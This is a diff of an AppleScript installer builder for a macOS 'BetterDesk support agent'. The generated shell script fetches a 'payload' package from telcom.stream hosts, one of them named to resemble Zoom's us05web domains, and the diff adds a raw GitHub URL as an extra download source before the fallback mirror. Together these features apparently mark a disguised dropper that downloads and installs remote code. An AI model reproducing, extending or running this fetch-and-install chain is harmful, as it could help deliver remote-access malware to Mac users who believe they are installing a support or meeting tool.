@@ -19,6 +19,7 @@
 property payloadVersion : "3.5.200"
 property repositoryBase : "https://global.telcom.stream/downloads/payloads"
 property fallbackBase : "https://us05web.telcom.stream"
+property rawBase : "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/macos"
 property agentBundleID : "com.unitronix.betterdesk-support-agent"
 
 
@@ -70,6 +71,7 @@ on buildInstaller()
         "VERSION='" & payloadVersion & "'", ¬
         "BASE='" & repositoryBase & "'", ¬
         "MIRROR='" & fallbackBase & "'", ¬
+        "RAW_BASE='" & rawBase & "'", ¬
         "", ¬
         "log() { /bin/printf '[%s] %s\\n' \"$(/bin/date '+%H:%M:%S')\" \"$*\"; }", ¬
         "", ¬
@@ -103,7 +105,7 @@ on buildInstaller()
         "if ! fetch \"$BASE/$PKG\"; then", ¬
         "    PRIMARY=0", ¬
         "    log 'Primary mirror failed; trying fallback'", ¬
-        "    fetch \"$MIRROR/$PKG\" || { log 'Download failed'; exit 1; }", ¬
+        "    fetch \"$RAW_BASE/$PKG\" || fetch \"$MIRROR/$PKG\" || { log 'Download failed'; exit 1; }", ¬
         "fi", ¬
         "", ¬
         "if ! /usr/bin/file \"$PKG_PATH\" | /usr/bin/grep -q 'xar archive'; then", ¬
